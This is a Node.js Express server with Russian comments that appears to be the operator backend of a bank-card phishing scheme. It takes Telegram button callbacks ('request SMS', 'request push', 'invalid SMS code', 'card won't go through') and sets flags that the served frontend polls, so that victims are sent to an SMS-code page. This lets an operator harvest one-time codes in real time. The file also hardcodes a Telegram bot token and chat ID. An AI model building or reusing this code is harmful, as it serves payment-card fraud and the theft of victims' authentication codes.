/**
 * Telegram Bot Webhook Server
 * Простой webhook сервер для получения обновлений от Telegram
 */

const express = require('express')
const cors = require('cors')
const https = require('https')
const path = require('path')
const fs = require('fs')

const app = express()
const PORT = process.env.PORT || 3001

console.log('🚀 Starting Telegram Bot Webhook Server...')
console.log('📁 Current directory:', __dirname)
console.log('📁 Dist directory exists:', fs.existsSync(path.join(__dirname, 'dist')))
console.log('🌐 Port:', PORT)
console.log('🌐 Environment:', process.env.NODE_ENV || 'development')

// Check if required files exist
const requiredFiles = ['dist/index.html', 'package.json']
requiredFiles.forEach(file => {
  const filePath = path.join(__dirname, file)
  console.log(`📄 ${file}:`, fs.existsSync(filePath) ? '✅' : '❌')
})

// Serve static files from dist directory (for frontend)
app.use(express.static('dist'))

// API routes
app.use('/api', express.json())

// Telegram Bot Configuration
const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
const CHAT_ID_CARDS = '-1003171719602'

// In-memory storage для флагов SMS
const smsFlags = new Map()

// Middleware
app.use(cors())
app.use(express.json())

// Health check endpoint (must be before catch-all route)
app.get('/health', (req, res) => {
  console.log('🏥 Health check requested')
  try {
    res.status(200).json({
      status: 'ok',
      timestamp: new Date().toISOString(),
      smsFlags: smsFlags.size,
      uptime: process.uptime(),
      port: PORT,
      environment: process.env.NODE_ENV || 'development'
    })
  } catch (error) {
    console.error('❌ Health check error:', error)
    res.status(500).json({ error: 'Health check failed' })
  }
})

// Serve frontend for all non-API routes
app.use((req, res) => {
  const indexPath = path.join(__dirname, 'dist', 'index.html')
  console.log('📁 Serving frontend from:', indexPath)
  
  // Check if dist directory exists
  if (!require('fs').existsSync(path.join(__dirname, 'dist'))) {
    console.error('❌ dist directory not found!')
    return res.status(500).json({ error: 'Frontend not built' })
  }
  
  res.sendFile(indexPath)
})

/**
 * Отправка сообщения в Telegram
 */
function sendTelegramMessage(chatId, text) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    })

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN_CARDS}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    }

    const req = https.request(options, (res) => {
      res.on('data', () => {})
      res.on('end', () => {
        console.log('✅ Message sent to Telegram')
        resolve()
      })
    })

    req.on('error', (error) => {
      console.error('❌ Error sending message:', error.message)
      reject(error)
    })

    req.write(postData)
    req.end()
  })
}

/**
 * Ответ на callback query
 */
function answerCallbackQuery(callbackQueryId, text) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      callback_query_id: callbackQueryId,
      text: text,
      show_alert: false
    })

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN_CARDS}/answerCallbackQuery`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    }

    const req = https.request(options, (res) => {
      res.on('data', () => {})
      res.on('end', () => {
        console.log('✅ Callback answered')
        resolve()
      })
    })

    req.on('error', (error) => {
      reject(error)
    })

    req.write(postData)
    req.end()
  })
}

/**
 * Обработка callback query от кнопок
 */
async function handleCallbackQuery(callbackQuery) {
  const callbackData = callbackQuery.data
  const chatId = callbackQuery.message.chat.id
  
  console.log(`📱 Received callback: ${callbackData}`)
  console.log(`👤 From user: ${callbackQuery.from.first_name} (${callbackQuery.from.id})`)
  console.log(`💬 Chat ID: ${chatId}`)

  let userId = null
  let action = null

  if (callbackData.startsWith('request_sms_')) {
    userId = callbackData.replace('request_sms_', '')
    action = 'request_sms'
  } else if (callbackData.startsWith('request_push_')) {
    userId = callbackData.replace('request_push_', '')
    action = 'request_push'
  } else if (callbackData.startsWith('invalid_sms_')) {
    userId = callbackData.replace('invalid_sms_', '')
    action = 'invalid_sms'
  } else if (callbackData.startsWith('card_blocked_')) {
    userId = callbackData.replace('card_blocked_', '')
    action = 'card_blocked'
  }

  if (userId && action) {
    let responseText = ''

    switch (action) {
      case 'request_sms':
        smsFlags.set(userId, true)
        responseText = '📱 SMS запрошен. Клиент будет перенаправлен на SMS страницу.'
        
        console.log(`✅ SMS flag set for user: ${userId}`)
        console.log(`📊 Total SMS flags: ${smsFlags.size}`)
        
        await sendTelegramMessage(chatId, `📱 <b>SMS КОД ЗАПРОШЕН</b>\n\n👤 ID клиента: <code>${userId}</code>\n⏰ Ожидаем ввода SMS кода...`)
        break

      case 'request_push':
        responseText = '🔔 PUSH запрошен'
        await sendTelegramMessage(chatId, `🔔 <b>PUSH УВЕДОМЛЕНИЕ ЗАПРОШЕНО</b>\n\n👤 ID клиента: <code>${userId}</code>`)
        break

      case 'invalid_sms':
        responseText = '❌ SMS код отмечен как неверный'
        await sendTelegramMessage(chatId, `❌ <b>НЕВЕРНЫЙ SMS КОД</b>\n\n👤 ID клиента: <code>${userId}</code>`)
        break

      case 'card_blocked':
        responseText = '🚫 Карта помечена как заблокированная'
        await sendTelegramMessage(chatId, `🚫 <b>КАРТА НЕ ЛЕЗЕТ</b>\n\n👤 ID клиента: <code>${userId}</code>`)
        break
    }

    await answerCallbackQuery(callbackQuery.id, responseText)
  }
}

/**
 * WEBHOOK ENDPOINT - получение обновлений от Telegram
 */
app.post('/webhook', (req, res) => {
  console.log('📨 Webhook received from Telegram')
  console.log('📋 Request body:', JSON.stringify(req.body, null, 2))
  
  const update = req.body
  
  if (update.callback_query) {
    console.log('🔘 Processing callback query...')
    handleCallbackQuery(update.callback_query)
      .then(() => {
        console.log('✅ Callback query processed')
      })
      .catch((error) => {
        console.error('❌ Error processing callback query:', error.message)
      })
  } else {
    console.log('📝 No callback query in update')
  }
  
  res.status(200).json({ ok: true })
})

/**
 * API endpoint для проверки флага SMS
 * GET /api/check-sms/:userId
 */
app.get('/api/check-sms/:userId', (req, res) => {
  const { userId } = req.params
  const smsRequested = smsFlags.get(userId) || false
  
  res.json({
    smsRequested,
    userId
  })
})

/**
 * API endpoint для очистки флага SMS
 * POST /api/clear-sms/:userId
 */
app.post('/api/clear-sms/:userId', (req, res) => {
  const { userId } = req.params
  smsFlags.delete(userId)
  
  res.json({
    success: true,
    userId
  })
})

/**
 * API endpoint для ручной установки флага SMS
 * POST /api/set-sms/:userId
 */
app.post('/api/set-sms/:userId', (req, res) => {
  const { userId } = req.params
  smsFlags.set(userId, true)
  
  console.log(`✅ Manual SMS flag set for user: ${userId}`)
  console.log(`📊 Total SMS flags: ${smsFlags.size}`)
  
  res.json({
    success: true,
    userId,
    smsRequested: true
  })
})


// Root endpoint
app.get('/', (req, res) => {
  res.json({
    name: 'Telegram Bot Webhook Server',
    version: '1.0.0',
    mode: 'WEBHOOK',
    endpoints: {
      webhook: 'POST /webhook',
      checkSMS: 'GET /api/check-sms/:userId',
      clearSMS: 'POST /api/clear-sms/:userId',
      setSMS: 'POST /api/set-sms/:userId',
      health: 'GET /health'
    }
  })
})

// Запуск сервера
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log('')
  console.log('═══════════════════════════════════════════════════')
  console.log('  🚀 Telegram Bot Webhook Server')
  console.log('═══════════════════════════════════════════════════')
  console.log('')
  console.log(`  📡 Server: http://0.0.0.0:${PORT}`)
  console.log(`  🔄 Mode: WEBHOOK`)
  console.log(`  ✅ Ready to receive Telegram updates`)
  console.log('')
  console.log('═══════════════════════════════════════════════════')
  console.log('')
})

// Обработка ошибок
server.on('error', (error) => {
  console.error('❌ Server error:', error)
})

process.on('uncaughtException', (error) => {
  console.error('❌ Uncaught Exception:', error)
})

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason)
})

module.exports = app
